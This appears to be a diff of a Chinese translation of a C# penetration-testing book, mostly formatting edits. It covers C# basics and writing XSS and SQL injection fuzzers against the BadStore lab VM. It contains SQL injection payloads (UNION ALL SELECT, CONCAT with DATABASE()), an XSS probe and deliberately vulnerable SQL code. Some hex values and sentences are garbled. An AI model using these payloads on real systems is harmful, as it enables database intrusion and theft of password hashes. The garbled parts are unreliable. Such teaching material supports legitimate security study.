+在本书的编写过程中，我根据是在 Ubuntu 还是 OS X 上分别使用了 MonoDevelop 和 Xamarin Studio。在 Ubuntu 上，你可以使用 apt 包管理器轻松安装 MonoDevelop。MonoDevelop 由 Xamarin 公司维护，该公司也维护 Mono。要安装它，请使用以下命令：`$ sudo apt-get install monodevelop`
 
 Xamarin Studio 是 MonoDevelop IDE 的 OS X 版本。Xamarin Studio 和 MonoDevelop 具有相同的功能，但用户界面略有不同。你可以从 Xamarin 网站 https://www.xamarin.com/download-it/ 下载 Xamarin Studio IDE 的安装程序。
 
@@ -1038,7 +1141,7 @@ class MainClass {
 
 C# 中存在简单的数据结构（如字符串），也可以创建更复杂的结构。`DateTime` 类是一个用于处理日期的 C# 类。在我们的示例中，我们使用它在变量中存储当前日期和时间（`DateTime.Now`）。最后，在声明变量后，我们可以使用 Console 的 `Write()` 和 `WriteLine()` 方法打印一条友好的消息（后者在末尾包含一个换行符）。
 
-如果你正在使用 IDE，可以通过点击 IDE 左上角的运行按钮（看起来像播放按钮）或按下 F5 键来编译并运行代码。但是，如果你想用 Mono 编译器从命令行编译源代码，也可以轻松做到。在包含 C# 类代码的目录中，使用 Mono 自带的 `mcs` 工具将你的类编译为可执行文件，例如：$ mono Main.cs -out:ch1_hello_world.exe。运行列表 1-1 中的代码应该会像列表 1-2 所示打印出字符串和当前日期。在 Unix 系统上，你可能需要运行 `mono ch1_hello_world.exe`。
+如果你正在使用 IDE，可以通过点击 IDE 左上角的运行按钮（看起来像播放按钮）或按下 F5 键来编译并运行代码。但是，如果你想用 Mono 编译器从命令行编译源代码，也可以轻松做到。在包含 C# 类代码的目录中，使用 Mono 自带的 `mcs` 工具将你的类编译为可执行文件，例如：`$ mono Main.cs -out:ch1_hello_world.exe`。运行列表 1-1 中的代码应该会像列表 1-2 所示打印出字符串和当前日期。在 Unix 系统上，你可能需要运行 `mono ch1_hello_world.exe`。
 
 ```
 $ ./ch1_hello_world.exe
@@ -1065,12 +1168,12 @@ public abstract class PublicServant{
 ```
 
 列表 1-3：PublicServant 类
+
 PublicServant 类是一种特殊的类。它是一个抽象类 ①。通常你可以像其他类型的变量一样创建一个类，并称为实例或对象。然而，抽象类不能像其他类那样实例化；它们只能通过子类继承。有很多公职人员——消防员和警察是立刻想到的两种。因此，让这两个类型的公职人员继承一个基类是合理的。在这种情况下，如果这两个类是 PublicServant 的子类，它们将继承 `PensionAmount` 属性 ② 和一个必须由 PublicServant 子类实现的 `DriveToOfInterest` 委托 ③。
 
 ## 创建接口
 
 接口是 C# 的补充。接口允许程序员强制类实现某些属性或方法，这些
-
 
 并不是继承的。让我们从创建一个简单的接口开始，如列表 1-4 所示。这个接口被称为 IPerson，它将声明人们通常拥有的几个属性。
 
@@ -1083,7 +1186,9 @@ public interface IPerson
 ```
 
 列表 1-4：IPerson 接口
+
 注意
+
 C# 中的接口通常以 I 开头，以便将它们与实现它们的类区分开来。这并不是强制要求的，但它是主流 C# 开发中一种非常常见的模式。
 
 如果一个类实现了 IPerson 接口，那么该类就需要在其内部同时实现 `Name` 和 `Age` 属性。否则，它将无法编译。在接下来的实现 IPerson 接口的 Fighter 类时，我将准确向你们展示这具体意味着什么。现在，只需要知道接口是 C# 中一个重要且实用的特性。熟悉 Java 接口的程序员会觉得它们非常亲切。C 程序员可以将它们看作带有函数声明的头文件，这些声明期望一个 .c 文件来实现这些函数。熟悉 Perl、Ruby 或 Python 的人起初可能会觉得接口很奇怪，因为它们的语言中没有类似的特性。
@@ -1213,7 +1318,6 @@ static void PrintPensionAmount(PublicServant servant)
 
 列表 1-7：使用 Main() 方法整合 PoliceOfficer 和 Fighter 类
 
-
 ```csharp
 public DriveToPlaceOfInterestDelegate DriveToPlaceOfInterest() { get; set; }
 }
@@ -1221,11 +1325,13 @@ public DriveToPlaceOfInterestDelegate DriveToPlaceOfInterest() { get; set; }
 
 列表 1-9：带有委托的 PublicServant 类
 
-在之前的 PublicServant 类中，如果我们想更改 `DriveToPlaceOfInterest()` 方法，就需要对其进行重写。在新的 PublicServant 类中，`DriveToPlaceOfInterest()` 被一个委托 ❶ 和一个属性 ❷ 取代，这使我们能够能够调用和分配 `DriveToPlaceOfInterest()`。现在，任何继承自 PublicServant 的类都将拥有一个委托，它们可以使用该委托为 `DriveToPlaceOfInterest()` 设置自己的匿名方法，而无需在每个类中重写该方法。由于它们继承自 PublicServant，我们需要相应地更新 Firefighter 和 PoliceOfficer 类的构造函数。
 
-## 更新 Firefighter 类
 
-我们将使用新的委托属性更新 Firefighter 类。列表 1-10 所示的构造函数是我们所做的唯一更改。
+在之前的`PublicServant`类中，如果我们想更改`DriveToPlaceOfInterest()`方法，就需要对其进行重写。在新的`PublicServant`类中，`DriveToPlaceOfInterest()`被一个委托❶和一个属性❷取代，这使我们能够调用和分配`DriveToPlaceOfInterest()`。现在，任何继承自`PublicServant`的类都将拥有一个委托，它们可以使用该委托为`DriveToPlaceOfInterest()`设置自己的匿名方法，而无需在每个类中重写该方法。由于它们继承自`PublicServant`，我们需要相应地更新`Firefighter`和`PoliceOfficer`类的构造函数。
+
+## 更新`Firefighter`类
+
+我们将使用新的委托属性更新`Firefighter`类。列表 1-10 所示的构造函数是我们所做的唯一更改。
 
 ```csharp
 public Firefighter(string name, int age)
@@ -1243,13 +1349,13 @@ public Firefighter(string name, int age)
 }
 ```
 
-列表 1-10：使用委托执行 DriveToPlaceOfInterest() 方法的 Firefighter 类
+列表 1-10：使用委托执行`DriveToPlaceOfInterest()`方法的`Firefighter`类
 
-在新的 Firefighter 类构造函数 ❶ 中，我们像以前一样分配了 `Name` ❷。接下来，我们创建了匿名方法并使用 `+=` 运算符 ❺将其分配给 `DriveToPlaceOfInterest` 委托属性，这样调用 `DriveToPlaceOfInterest()` 就会调用该匿名方法。此匿名方法打印“Driving the firetruck”，然后运行原始类中的空方法。通过这样，我们可以为类中的每个方法添加我们所需的自定义代码，而无需重写它。
+在新的`Firefighter`类构造函数❶中，我们像以前一样分配了`Name`❷。接下来，我们创建了匿名方法并使用`+=`运算符❺将其分配给`DriveToPlaceOfInterest`委托属性，这样调用`DriveToPlaceOfInterest()`就会调用该匿名方法。此匿名方法打印“Driving the firetruck”，然后运行原始类中的空方法。通过这样，我们可以为类中的每个方法添加我们所需的自定义代码，而无需重写它。
 
 ## 创建可选参数
 
-PoliceOfficer 类也需要类似的更改；我们按照列表 1-11 所示更新了构造函数。由于我们已经在更新此类类，还可以将其更改为使用可选参数，可选参数是构造函数中的一个参数，在创建新实例时不必须包含。我们将创建两个匿名方法，并使用可选参数来决定将哪个方法分配给委托。
+`PoliceOfficer`类也需要类似的更改；我们按照列表 1-11 所示更新了构造函数。由于我们已经在更新此类，还可以将其更改为使用可选参数，可选参数是构造函数中的一个参数，在创建新实例时不必须包含。我们将创建两个匿名方法，并使用可选参数来决定将哪个方法分配给委托。
 
 ```csharp
 public PoliceOfficer(string name, int age, bool hasEmergency = false)
@@ -1276,13 +1382,13 @@ if (this.HasEmergency)
 }
 ```
 
-列表 1-11：新的 PoliceOfficer 构造函数
+列表 1-11：新的`PoliceOfficer`构造函数
 
-在新的 PoliceOfficer 构造函数中，我们像最初那样设置了 `Name` 和 `Age` 属性。然而，这次我们还使用第三个可选参数来分配 `HasEmergency` 属性。第三个参数是*可选的*，因为它不需要指定；当构造函数仅提供前两个参数时，它有一个默认值（false）。然后我们根据 `HasEmergency` 是否为真，用新的匿名方法设置 `DriveToPlaceOfInterest` 委托属性。
+在新的`PoliceOfficer`构造函数中，我们像最初那样设置了`Name`和`Age`属性。然而，这次我们还使用第三个可选参数来分配`HasEmergency`属性。第三个参数是`可选的`，因为它不需要指定；当构造函数仅提供前两个参数时，它有一个默认值（false）。然后我们根据`HasEmergency`是否为真，用新的匿名方法设置`DriveToPlaceOfInterest`委托属性。
 
-## 更新 Main() 方法
+## 更新`Main()`方法
 
-有了新的构造函数，我们可以运行一个与第一个几乎相同的更新后的 `Main()` 方法。详细内容请见列表 1-12。
+有了新的构造函数，我们可以运行一个与第一个几乎相同的更新后的`Main()`方法。详细内容请见列表 1-12。
 
 ```csharp
 public static void Main(string[] args)
@@ -1312,13 +1418,13 @@ public static void Main(string[] args)
 }
 ```
 
-列表 1-12：使用委托前往感兴趣地点的 Main 方法
+列表 1-12：使用委托前往感兴趣地点的`Main`方法
 
-区别在于最后三行，它们演示了一个具有紧急情况的对象（构造函数的第三个参数为 true），而不是没有紧急情况的 Jane Hope。我们对 John Valor 对象调用 `DriveToPlaceOfInterest()`。
+区别在于最后三行，它们演示了一个具有紧急情况的对象（构造函数的第三个参数为 true），而不是没有紧急情况的 Jane Hope。我们对 John Valor 对象调用`DriveToPlaceOfInterest()`。
 
-## 运行更新后的 Main 方法
+## 运行更新后的`Main`方法
 
-运行新方法显示了创建两个 PoliceOfficer 类（一个有紧急情况，一个没有）将输出不同的内容，如列表 1-13 所示。
+运行新方法显示了创建两个`PoliceOfficer`类（一个有紧急情况，一个没有）将输出不同的内容，如列表 1-13 所示。
 
 ```bash
 the_basics_advanced.exe
@@ -1335,15 +1441,15 @@ Age: 32
 Driving the car with siren
 ```
 
-列表 1-13：带有委托运行的新 Main 方法
+列表 1-13：带有委托运行的新`Main`方法
 
-你可以看到，创建一个具有紧急情况的 PoliceOfficer 类会导致官员开启警报行驶。相反，Jane Hope 在不开启警报的情况下，因为因为没有紧急情况。
+你可以看到，创建一个具有紧急情况的`PoliceOfficer`类会导致官员开启警报行驶。相反，Jane Hope 在不开启警报的情况下，因为没有紧急情况。
 
 ## 与原生库集成
 
-最后，有时你需要使用仅适用于标准库，例如 Linux 上的 `libc` 和 Windows 上的 `user32.dll`。如果你计划使用用 C、C++ 或其他编译为原生汇编的语言编写的代码，C# 让处理这些原生库变得非常简单，我们将在第 4 章制作跨平台 Metasploit 负载时使用这种技术。这种功能被称为 Invoke，简称为 P/Invoke。程序员经常需要使用原生库，因为它们比 .NET 或 Java 使用的虚拟机更快。金融或科学专业人士等需要进行大量计算的程序员可能会用 C 编写他们需要快速的代码（例如直接与硬件交互），但使用 C# 来处理速度要求不高的代码。
+最后，有时你需要使用仅适用于标准库，例如 Linux 上的`libc`和 Windows 上的`user32.dll`。如果你计划使用用 C、C++ 或其他编译为原生汇编的语言编写的代码，C#让处理这些原生库变得非常简单，我们将在第 4 章制作跨平台 Metasploit 负载时使用这种技术。这种功能被称为 Invoke，简称为 P/Invoke。程序员经常需要使用原生库，因为它们比 .NET 或 Java 使用的虚拟机更快。金融或科学专业人士等需要进行大量计算的程序员可能会用 C 编写他们需要快速的代码（例如直接与硬件交互），但使用 C#来处理速度要求不高的代码。
 
-列表 1-14 显示了一个使用 P/Invoke 调用 Linux 上的标准 C 函数 `print()` 或在 Windows 上使用 `user32.dll` 弹出对话框的应用。
+列表 1-14 显示了一个使用 P/Invoke 调用 Linux 上的标准 C 函数`print()`或在 Windows 上使用`user32.dll`弹出对话框的应用。
 
 ```csharp
 class MainClass
@@ -1372,15 +1478,11 @@ class MainClass
 
 列表 1-14：通过简单示例演示 P/Invoke
 
-
-
-
-
 ## 2 XSS 与 SQL 注入的模糊测试与利用
 
 ![](img/059a0f6a8101e80261ab133380da85bd_34_0.png)
 
-在本章中，你将学习如何编写一个简单高效的跨站脚本 (XSS) 和 SQL 注入模糊测试器，用于处理接收 GET 和 POST 请求 HTTP 参数的 URL。模糊测试器（fuzzer）是一种通过发送错误或格式异常的数据来尝试发现其他软件（如服务器上的软件）错误的软件。模糊测试器主要有两种类型：变异型（mutational）和生成型（generational）。变异型模糊测试器尝试用坏数据污染已知良好输入中的数据，而不忽略底层的协议或数据结构。相比之下，生成型模糊测试器会考虑服务器通信协议的细微差别，并利用这些细微差别生成在技术上有效的数据并发送到服务器。对于这两种类型的模糊测试器，目标都是让服务器向模糊测试器返回错误信息。
+在本章中，你将学习如何编写一个简单高效的跨站脚本（XSS）和 SQL 注入模糊测试器，用于处理接收 GET 和 POST 请求 HTTP 参数的 URL。模糊测试器（fuzzer）是一种通过发送错误或格式异常的数据来尝试发现其他软件（如服务器上的软件）错误的软件。模糊测试器主要有两种类型：变异型（mutational）和生成型（generational）。变异型模糊测试器尝试用坏数据污染已知良好输入中的数据，而不忽略底层的协议或数据结构。相比之下，生成型模糊测试器会考虑服务器通信协议的细微差别，并利用这些细微差别生成在技术上有效的数据并发送到服务器。对于这两种类型的模糊测试器，目标都是让服务器向模糊测试器返回错误信息。
 
 我们将编写一个变异型模糊测试器，当你拥有以 URL 或 HTTP 请求形式存在的已知良好输入时可以使用它。（我们将在 3 章编写生成型模糊测试器）。一旦你能够使用模糊测试器发现 XSS 和 SQL 注入漏洞，你将学习如何利用 SQL 注入漏洞从数据库中提取用户名和密码哈希值。
 
@@ -1396,11 +1498,11 @@ class MainClass
 
 在设置虚拟机之前，你可能需要为虚拟机创建一个主机仅虚拟网络。主机仅网络仅允许虚拟机和主机系统之间的通信。以下是操作步骤：
 
-1. 点击**文件 ► 首选项**打开 VirtualBox – 首选项对话框。在 OS X 上，选择 **VirtualBox ► 首选项**。
+1. 点击**文件 ► 首选项**打开 VirtualBox – 首选项对话框。在 OS X 上，选择**VirtualBox ► 首选项**。
 2. 点击左侧的**网络**。你应该看到两个选项卡：NAT 网络（NAT Networks）和主机仅网络（Host-only Networks）。在 OS X 上，点击设置顶部的**网络**选项卡。
-3. 点击**主机仅网络**，然后点击右侧的**添加主机仅网络 (内)**按钮。该按钮是一个叠加了加号的网卡图标。这应该创建一个名为 vboxnet0 的网络。
-4. 点击右侧的**编辑主机仅网络 (空格)** 按钮。该按钮是一个螺丝刀图标。
-5. 从打开的对话框中，点击**DHCP 服务器**选项卡。勾选**启用服务器**。在服务器地址字段中输入 IP 地址 192.168.56.2。在服务器子掩码字段中输入 255.255.255.0。在低地址界限字段中输入 192.168.56.100。在高地址界限字段中输入 192.168.56.199。
+3. 点击**主机仅网络**，然后点击右侧的**添加主机仅网络（内）**按钮。该按钮是一个叠加了加号的网卡图标。这应该创建一个名为`vboxnet0`的网络。
+4. 点击右侧的**编辑主机仅网络（空格）**按钮。该按钮是一个螺丝刀图标。
+5. 从打开的对话框中，点击**DHCP 服务器**选项卡。勾选**启用服务器**。在服务器地址字段中输入 IP 地址`192.168.56.2`。在服务器子掩码字段中输入`255.255.255.0`。在低地址界限字段中输入`192.168.56.100`。在高地址界限字段中输入`192.168.56.199`。
 6. 点击**确定**保存主机仅网络的更改。
 7. 再次点击**确定**关闭设置对话框。
 
@@ -1409,8 +1511,8 @@ class MainClass
 一旦安装了 VirtualBox 并配置了主机仅网络，按照以下步骤设置虚拟机（虚拟机）：
 
 1. 点击左上角的**新建**图标，如图 2-1 所示。
-2. 在显示的选择操作系统名称和类型的对话框中，选择**其他 Linux (32 位)** 下拉选项。
-3. 点击**继续**，你将看到一个为虚拟机分配内存（RAM）的屏幕。将内存 大小设置为 512 MB 并点击**继续**。（模糊测试和利用可能会让 Web 服务器在虚拟机上消耗大量内存。）
+2. 在显示的选择操作系统名称和类型的对话框中，选择**其他 Linux（32 位）**下拉选项。
+3. 点击**继续**，你将看到一个为虚拟机分配内存（RAM）的屏幕。将内存大小设置为 512 MB 并点击**继续**。（模糊测试和利用可能会让 Web 服务器在虚拟机上消耗大量内存。）
 4. 当询问是否创建新的虚拟硬盘时，选择**不添加虚拟硬盘**并点击**创建**。（我们将从 ISO 镜像运行 BadStore。）你现在应该可以在 VirtualBox 窗口的左侧面板看到虚拟机，如图 2-1 所示。
 
 ![](img/059a0f6a8101e80261ab133380da85bd_37_0.png)
@@ -1421,8 +1523,8 @@ class MainClass
 
 1. 在左侧面板中右键点击虚拟机并选择**设置**。
 2. 选择**存储**选项卡。
-3. 在控制器 (IDE) 下选择空光驱。
-4. 点击磁盘图标并选择 **选择 ISO 文件**。
+3. 在控制器（IDE）下选择空光驱。
+4. 点击磁盘图标并选择**选择 ISO 文件**。
 5. 点击**确定**保存设置。
 6. 点击**启动**启动虚拟机。
 
@@ -1430,10 +1532,10 @@ class MainClass
 
 1. 选择**网络**选项卡。
 2. 确保**主机仅**适配器已勾选。
-3. 连接到：**vboxnet0** 下拉菜单。
+3. 连接到：`vboxnet0`下拉菜单。
 4. 点击**确定**。
 
-现在你可以在主机上打开浏览器并导航到 `http://192.168.56.100/`。你应该看到 BadStore 登录页面。
+现在你可以在主机上打开浏览器并导航到`http://192.168.56.100/`。你应该看到 BadStore 登录页面。
 
 欢迎来到 BadStore！
 
@@ -1449,7 +1551,7 @@ class MainClass
 
 ## SQL 注入
 
-在今天的 Web 应用程序中，程序员需要存储和查询信息。这通常通过结构化查询语言（SQL；读作 sequel）在 MySQL、PostgreSQL 或 SQL Server数据库实现。SQL 允许程序员使用 SQL 语句与数据库交互。例如，查询用户数量的查询语句可能所示（2-1）。
+在今天的 Web 应用程序中，程序员需要存储和查询信息。这通常通过结构化查询语言（SQL；读作 sequel）在 MySQL、PostgreSQL 或 SQL Server 数据库实现。SQL 允许程序员使用 SQL 语句与数据库交互。例如，查询用户数量的查询语句可能所示（2-1）。
 
 ```sql
 SELECT COUNT(*) FROM USERS
@@ -1457,7 +1559,7 @@ SELECT COUNT(*) FROM USERS
 
 有时 SQL 语句需要动态的（即根据与应用程序的交互进行更改）。例如，程序员可能需要根据用户 ID 或用户名从数据库中选择信息。
 
-然而，当程序员使用来自不可信客户端（如 浏览器）的数据或值构建 SQL 语句时，如果构建语句的值没有经过妥善过滤，可能会引入 SQL 漏洞。例如，列表 2 所示的 C# SOAP 方法可能用于插入数据库。（SOAP 或简单访问协议是一种由 XML 驱动的 Web 技术，用于在 Web 应用程序上快速创建 API。在 C# 和 Java 等企业语言中非常流行。）
+然而，当程序员使用来自不可信客户端（如浏览器）的数据或值构建 SQL 语句时，如果构建语句的值没有经过妥善过滤，可能会引入 SQL 漏洞。例如，列表 2 所示的 C# SOAP 方法可能用于插入数据库。（SOAP 或简单访问协议是一种由 XML 驱动的 Web 技术，用于在 Web 应用程序上快速创建 API。在 C# 和 Java 等企业语言中非常流行。）
 
 ```csharp
 [WebMethod]
@@ -1478,16 +1580,15 @@ public string AddUser(string username, string password)
 
 列表 2：一个易受 SQL 注入的 C# SOAP 方法
 
-在这种情况下，程序员在创建和执行 SQL 字符串之前对用户名和密码进行过滤。因此，攻击者可以构造用户名或密码字符串，让数据库运行构造的 代码，从而获得远程命令执行和对数据库的完全控制权。
+在这种情况下，程序员在创建和执行 SQL 字符串之前对用户名和密码进行过滤。因此，攻击者可以构造用户名或密码字符串，让数据库运行构造的代码，从而获得远程命令执行和对数据库的完全控制权。
 
-如果你在其中一个参数中传递带有单引号的名称（例如 username 代替 username），ExecuteNonQuery() 方法将尝试运行一个无效的 SQL 查询（如列表 2-3 所示）。该方法将抛出一个异常，异常将出现在 HTTP 响应中供攻击者查看。
+如果你在其中一个参数中传递带有单引号的名称（例如 username 代替 username），`ExecuteNonQuery()`方法将尝试运行一个无效的 SQL 查询（如列表 2-3 所示）。该方法将抛出一个异常，异常将出现在 HTTP 响应中供攻击者查看。
 
-| insert into users('username', 'password'); 列表 2-3：由于未过滤的用户提供的数据，该 SQL 查询是无效的。 |
-
-
+| `insert into users('username', 'password');` 列表 2-3：由于未过滤的用户提供的数据，该 SQL 查询是无效的。 |
 
 
-参数化查询。这些库通过转义单引号、括号以及 SQL 语法中使用的其他特殊字符，自动对传递给 SQL 查询的不可信值进行清洗处理。参数化查询和其他类型的对象关系映射 (ORM) 库（如 NHibernate）有助于防止这些 SQL 注入问题。
+
+参数化查询。这些库通过转义单引号、括号以及 SQL 语法中使用的其他特殊字符，自动对传递给 SQL 查询的不可信值进行清洗处理。参数化查询和其他类型的对象关系映射 (ORM) 库（如 `NHibernate`）有助于防止这些 SQL 注入问题。
 
 用户提供的此类值通常用于 SQL 查询中的 `WHERE` 子句，如列表 2-4 所示。
 
@@ -1519,6 +1620,7 @@ Connection: keep-alive
 ```
 
 服务器响应的内容如列表 2-6 中的 HTTP 响应。
+
 ```
 HTTP/1.1 200 OK
 Date: 19 Apr 2015 21:28:02
@@ -1558,7 +1660,6 @@ www.example.com/vuln.php?name=Brandon<script>alert(1)</script> 列表 2-8：带�
 列表 2-5：带有查询字符串参数的 PHP 脚本的示例 GET 请求
 ```
 
-
 ```cs
 Console.WriteLine("SQL injection found in parameter: " + param);
 }
@@ -1577,6 +1678,7 @@ Console.WriteLine("SQL injection found in parameter: " + param);
 ```
 http://192.168.1.75/cgi-bin/badstore.cgi?searchquery=test&action=search
 ```
+
 *Listing 2-13: 通往 BadStore 搜索页的示例 URL*
 
 将列表 2-13 中的 URL（替换为你网络上 BadStore 实例的 IP 地址）作为命令行参数传递给程序，如列表 2-14 所示，模糊测试将开始。
@@ -1586,6 +1688,7 @@ $ fuzzer.exe "http://192.168.1.75/cgi-bin/badstore.cgi?searchQuery=test&action=s
 found found in parameter: searchQuery=test
 Possible XSS point found in parameter: searchQuery=test
 ```
+
 *Listing 2-14: 运行 XSS 和 SQL 注入模糊测试器*
 
 运行我们的模糊测试器应该可以在 BadStore 中发现 SQL 注入和 XSS 漏洞，输出与列表 2-14 类似。
@@ -1600,21 +1703,29 @@ Possible XSS point found in parameter: searchQuery=test
 $ cd ~/Downloads
 $ java -jar burpsuite.jar
 ```
+
 *Listing 2-15: 从命令行运行 Burp Suite*
 
 启动后，Burp Suite 代理应该监听端口 8080。如下所示设置 Firefox 流量使用 Burp 代理：
 
 1. 在 Firefox 内部，选择“Edit Preferences”（编辑选项）。将出现高级对话框。
+
 2. 选择“Network”（网络）选项卡，如图 2-3 所示。
+
 ![img/059a0f6a8101e80261ab333da85bd_47.png]
+
 图 2-3: 选项中的网络选项卡
+
 3. 点击“Settings...”打开连接对话框，如图 2-4 所示。
+
 ![img/059a0f6a8101e80261ab333da85bd_48.png]
+
 4. 选择“Manual proxy configuration”（手动代理配置），并在 HTTP Proxy 字段中输入 127.0.0.1，在 Port 字段中输入 8080。点击 OK 并关闭连接对话框。
 
 现在通过 Firefox 发送的所有请求将先通过 Burp。（要测试这一点，访问 http://google.com/；你应该在 Burp Suite 面板中看到该请求，如图 2-5 所示。）
 
 ![img/059a0f6a8101e80261ab333da85bd_49.png]
+
 图 2-5: Burp Suite 拦截来自 Firefox 对 google.com 的请求
 
 ## 编写 POST 请求模糊测试器
@@ -1622,6 +1733,7 @@ $ java -jar burpsuite.jar
 我们将编写并测试我们的 POST 请求模糊测试器，针对 BadStore 的“What’s New”页面（见图 2-6）。在 Firefox 中导航到此页面并点击“What’s New”项。
 
 ![img/059a0f6a8101e80261ab333da85bd_49.png]
+
 图 2-6: What’s New 页面
 
 页面底部的按钮用于将项目添加到购物车。在 Burp Suite 位于你的浏览器和 BadStore 服务器之间，使用页面右侧的复选框并点击提交以启动添加项目的 HTTP 请求。捕捉请求将得到类似列表 2-16 的请求。
@@ -1668,11 +1780,8 @@ foreach (string line in requestLines)
 string request = requestBuilder.ToString() + "\n";
 Console.WriteLine(request);
 ```
+
 *Listing 2-17: Main() 方法使用 Host 头从文件读取 POST 请求*
-
-
-
-
 
 # 模糊测试参数
 
@@ -1702,6 +1811,8 @@ foreach (string param in pars)
 ```
 
 > 列表 2-18: 添加到 Main() 方法中模糊 POST 参数的额外代码
+
+
 
 在列表 2-18 中，我们创建了一个由 `IPAddress.Parse(host)` 返回的新 `IEndPoint` 对象，该端口将连接到该 IP 地址 (80)。现在我们遍历之前从 `requestLines` 变量中获取的参数。对于每次迭代，我们需要为服务器创建一个新的 `Socket` 连接，并使用 `AddressFamily.InterNetwork` 告诉 socket 它是 IPv4（互联网协议的 4 版本，而不是 IPv6），并使用 `SocketType.Stream` 告诉 socket 它是流式 socket（有状态、双向且可靠的）。我们还使用 `ProtocolType.Tcp` 告诉 socket 使用的协议是 TCP。
 
@@ -1739,6 +1850,7 @@ CsharpJson 以 OVA 文件形式提供，这是一个完全自包含的虚拟机�
 
 ![](img/059a0f6a8101e80261ab133380da85bd)
 
+```
 POST /Vulnerable.ashx HTTP/1.1
 Host: 192.168.1.56
 User-Agent: Mozilla/5.0 (Macintosh; Intel OS X 10.10.6) AppleWebKit/537.36 (KHTML, like Gecko) rv:20100101 Firefox/26.0
@@ -1752,6 +1864,7 @@ Cookie: ASPNET_SessionId=d514BC0D339F054674D8B
 Connection: keep-alive
 
 {"username":"Hank","password":"123","city":"Austin","state":"TX","zip":"78701","method":"create"}
+```
 
 > 列表 2-20: 包含 JSON 的 HTTP 请求
 
@@ -1797,8 +1910,6 @@ foreach (var pair in (JObject)obj.DeepClone())
 if (pair.Value.Type == JTokenType.String || pair.Value.Type == JTokenType.Integer)
 ```
 
-
-
 ```cs
 {
 Console.WriteLine("Fuzzing key: " + pair.Key);
@@ -1824,6 +1935,7 @@ obj[pair.Key] = oldVal;
 `IterateAndFuzz()` 方法使用 `foreach` 循环开始遍历 `Object` 对象中的键值对。由于我们将通过在值中插入单引号来更改 JSON 内部的值，因此我们可以使用 `DeepClone()` 获取一个与第一个对象相同的独立对象。这允许我们在修改另一份 JSON 键值对的同时，遍历另一份。（在 `foreach` 循环中我们需要创建一个副本，否则你无法修改你正在遍历的对象。）在 `foreach` 循环内部，我们测试当前键值对是字符串还是整数，如果该值是字符串或整数类型，则继续对该值进行模糊测试。在打印消息后，我们测试该值是否为整数，以告知用户我们正在将该值从整数转换为字符串。
 
 注意
+
 由于 JSON 中的整数没有引号且必须是整数或浮点数，因此插入带有单引号的值会导致解析异常。许多使用 Ruby on Rails 或 Python 构建的弱类型 Web 应用程序不会关心 JSON 值类型的更改，但使用 Java 或 C# 构建的强类型 Web 应用程序的行为可能不符合预期。该应用程序并不关心类型是否被故意更改。
 
 接下来，我们将旧值存储在 `oldVal` 中，以便在对当前键值对完成模糊测试后将其替换。在存储旧值后，我们使用原始值重新赋值当前值，但在值的末尾添加一个单引号，这样如果它被放入 SQL 查询中，就应该导致解析异常。
@@ -1868,7 +1980,6 @@ private static bool Fuzz(string url, TObject obj)
 
 发现可能的 SQL 注入只是渗透测试工作的一半；利用它们是更重要、也更困难的一半。在前面的章节中
 
-
 在本章中，我们使用 BadStore 的一个 URL 对 HTTP 查询参数进行模糊测试，其中一个存在漏洞的查询字符串参数名为 `searchquery`（参见第 25 页的列表 2-13）。URL 查询参数 `searchquery` 容易受到两种类型的 SQL 注入攻击。这两种注入类型（基于布尔和基于 union）都非常有用，因此我将使用相同的 BadStore URL 描述如何编写这两种类型的利用程序。
 
 在利用 SQL 注入时，`UNION` 技术更易使用。当你能够控制 SQL 查询的末尾时，可以在 `SELECT` 查询中使用 `UNION`。可以将 `UNION` 语句附加到 `SELECT` 语句末尾的攻击者可以向 Web 应用返回程序员最初意图之外的数据行。
@@ -1885,7 +1996,7 @@ private static bool Fuzz(string url, TObject obj)
 
 列表 2-27：当 UNION 左右的 SELECT 查询不平衡时的 MySQL 错误示例
 
-让我们以 BadStore Web 应用中的漏洞代码行（badstore.cgi，第 203 行）为例，看看它选择了多少列（参见列表 2-28）。
+让我们以 BadStore Web 应用中的漏洞代码行（`badstore.cgi`，第 203 行）为例，看看它选择了多少列（参见列表 2-28）。
 
 ```
 $=SELECT itum, sdesc, idesc, price FROM itemdb WHERE 'sqquery' IN (itum,sdesc,idesc); Listing 2-28: BadStore Web 应用中选择四列的漏洞行
@@ -1899,14 +2010,10 @@ searchquery=fdas+UNION+ALL+SELECT+NULL,'hacked',NULL%23
 
 列表 2-29：正确平衡的 SQL 注入，从数据库带回了单词 hacked
 
-```
-
 当此负载中的 `searchquery` 值被传递给应用程序时，`searchquery` 变量被直接用于发送到数据库的 SQL 查询中，我们将原始程序无意编写的原始 SQL 查询（如列表 2-28）转换为列表 2-30 中的新 SQL 查询。
 
 ```
 SELECT item,sdesc,ldesc,price FROM item WHERE 'fdas' UNION ALL NULL,'hacked',NULL# (item,sdesc,ldesc) Listing 2-30: 附加负载的完整查询返回了单词 hacked
-```
-
 ```
 
 我们使用哈希标记 `#` 来截断原始 SQL 查询，使任何不会被 MySQL 执行的代码都失效。现在，我们想要在 Web 服务器响应中获得的任何额外数据（在本例中为单词 `hacked`）应该位于 `UNION` 的第三列。
@@ -1916,8 +2023,9 @@ SELECT item,sdesc,ldesc,price FROM item WHERE 'fdas' UNION ALL NULL,'hacked',NUL
 ```
 searchquery=fdas+UNION+ALL+SELECT+NULL,CONCAT(0x7176aa1,'hacked'),NULL
 Listing 2-31：searchquery 参数的示例负载，返回单词 hacked
-
 ```
+
+
 
 列表 2-31 中的负载使用十六进制值将数据添加到我们通过负载选择的额外值的两侧。如果负载在 HTML 中回显，正则表达式将不会意外匹配原始负载。在这个例中，`0x7176aa1` 是 `vqaj`，`0x716b26b` 是 `acked`。如果注入不起作用，搜索结果包含 `vqajacked`，例如 `vqaj.*acked` 的正则表达式将无法匹配负载中的十六进制值。`CONCAT()` 函数是一种方便的方法，可以确保我们的利用程序从 Web 响应中获取正确的数据。列表 2-32 显示了一个更有用的示例。在这里，我们可以替换之前的负载中的 `CONCAT()` 函数，用已知的标记包裹当前数据库。
 
@@ -1925,9 +2033,9 @@ Listing 2-31：searchquery 参数的示例负载，返回单词 hacked
 CONCAT(0x7176b2a1,DATABASE(),0x7176b671) Listing 2-32：返回当前数据库的示例负载
 ```
 
-BadStore 的注入结果应该是 `vqajbadstoreddbbkq`。例如 `vbzq(*)` 的正则表达式应该返回数据库的名称。
+BadStore 的注入结果应该是 `vqajbadstoreddbbkq`。例如，`vbzq(*)` 的正则表达式应该返回数据库的名称。
 
